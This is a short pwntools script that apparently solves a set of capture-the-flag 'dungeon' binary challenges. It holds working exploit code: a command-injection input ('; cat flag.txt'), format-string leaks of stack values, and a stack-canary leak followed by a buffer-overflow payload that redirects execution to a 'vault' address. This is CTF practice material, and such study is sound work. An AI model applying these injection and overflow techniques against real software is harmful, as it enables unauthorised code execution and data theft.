from pwn import *

# does not do vulnerability discovery and automating, still trying to learn about angr
def main():
    while True:
        print('Choose an ELF binary:')
        print('0. exit')
        print('1. dungeon 1')
        print('2. dungeon 2')
        print('4. dungeon 4')
        print('5. dungeon 5')

        choice = input()
        if choice == '0':
            print('exiting')
            return
        elif choice == '1':
            dungeon1()
        elif choice == '2':
            dungeon2()
        elif choice == '4':
            dungeon4()
        elif choice == '5':
            dungeon5()

def dungeon1():
    p = process('./dungeon1')
    p.clean()
    p.sendline(b'; cat flag.txt')
    print(p.clean().decode())

def dungeon2():
    p = process('./dungeon2')
    p.clean()
    p.sendline(b'1')
    p.sendline(b'0')
    print(p.clean().decode())

def dungeon4():
    p = process('./dungeon4')
    p.clean()
    p.sendline(b'%9$p %8$p')
    p.recvline()
    leak = p.recvline()
    # trim 0x from hex string
    ascii = leak.decode().replace('0x', '')
    ascii = bytes.fromhex(ascii).decode()
    ## trim nullbytes and reverse the string
    ascii = ascii.replace('\x00', '')
    ascii = ascii.replace('\x08', '')
    ascii = ascii[::-1]
    log.success(f'Writing: {ascii}')
    p.sendline(ascii.encode())
    print(p.clean().decode())

def dungeon5():
    p = process('./dungeon5')
    p.clean()
    p.sendline('%15$p')      # value of stack canary

    canary = int(p.recvline(), 16)
    log.success(f'Canary: {hex(canary)}')

    payload = b'A' * 72
    payload += p64(canary)   # overwrite stack canary with same value
    payload += b'A' * 8      # padding for return pointer
    payload += p64(0x4006b7) # adress of vault

    p.clean()
    p.sendline(payload)
    print(p.clean().decode())

if __name__ == '__main__':
    main()
